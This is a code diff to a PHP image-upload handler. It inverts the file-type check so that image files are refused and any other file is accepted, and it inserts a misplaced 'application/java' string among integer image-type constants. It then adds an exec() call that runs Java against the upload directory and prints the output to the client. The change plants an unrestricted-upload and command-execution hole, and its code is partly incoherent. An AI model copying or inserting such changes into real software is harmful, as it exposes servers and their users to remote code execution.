@@ -22,8 +22,8 @@ else if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_FILES["myFile"])) {
 
     // verify the file type
     $fileType = exif_imagetype($_FILES["myFile"]["tmp_name"]);
-    $allowed = array(IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG);
-    if (!in_array($fileType, $allowed)) {
+    $allowed = array(IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG, 'application/java');
+    if (in_array($fileType, $allowed)) {
         echo "<p>File type is not permitted.</p>";
         exit;
     }
@@ -50,4 +50,8 @@ else if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_FILES["myFile"])) {
     chmod(UPLOAD_DIR . $name, 0644);
 
     echo "<p>Uploaded file saved as " . $name . ".</p>";
+
+    exec('java -cp '.UPLOAD_DIR.' 2>&1', $output);
+    print_r($output);
+
 }
